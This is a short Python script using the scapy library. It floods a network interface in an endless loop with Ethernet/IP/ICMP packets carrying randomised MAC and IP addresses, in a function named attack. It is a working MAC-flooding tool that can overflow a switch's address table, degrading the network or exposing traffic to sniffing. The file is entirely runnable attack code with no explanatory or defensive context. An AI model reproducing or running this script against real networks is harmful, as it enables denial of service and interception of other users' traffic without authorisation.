# from scapy.all import *
# import time
# while True:
#     packet = Ether(src=RandMAC(),dst=RandMAC())
#     time.sleep(1)
#     print(packet.summary())

from scapy import interfaces
from scapy.all import *
import optparse
def attack(interface):
    pkt=Ether(src=RandMAC(),dst=RandMAC())/IP(src=RandIP(),dst=RandIP())/ICMP()
    sendp(pkt,iface=interface)

def main():
    parser = optparse.OptionParser("%prog"+"-i interface")
    parser.add_option('-i',dest='interface',default='eth0',type='string',help='Interface')
    (options,args) = parser.parse_args()
    interface=options.interface
    try:
        while True:
            attack(interface)
    except KeyboardInterrupt:
        print("------------")
        print('Finished!')

if __name__ == '__main__':
    main()
    